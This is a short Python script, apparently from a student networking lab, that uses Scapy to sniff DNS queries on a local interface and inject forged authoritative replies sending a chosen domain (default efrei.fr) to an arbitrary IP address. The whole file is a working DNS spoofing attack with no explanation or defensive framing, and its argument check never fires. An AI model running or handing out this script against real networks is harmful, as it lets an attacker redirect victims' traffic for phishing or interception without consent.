from scapy.all import *
import sys

def dnsSpoof(domain="efrei.fr", spoofedIp="13.37.13.37"):
    def process_packet(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qd:
            query_name = packet[DNS].qd.qname.decode()
            if domain in query_name:
                spoofedResponse = (
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNS].qd.qname, ttl=300, rdata=spoofedIp)
                    )
                )
                send(spoofedResponse, iface="eth0", verbose=1)
                print(f"Réponse envoyée : {domain} -> {spoofedIp}")
    sniff(filter="udp port 53", iface="eth0", prn=process_packet)

if __name__ == "__main__":
    if len(sys.argv) < 1:
        print("Utilisation : sudo python3 dns_spoof.py [Nom de domaine] [IP spoofée]")
        sys.exit(1)

    domain = sys.argv[1] if len(sys.argv) > 1 else "efrei.fr"
    spoofedIp = sys.argv[2] if len(sys.argv) > 2 else "13.37.13.37"

    dnsSpoof(domain, spoofedIp)
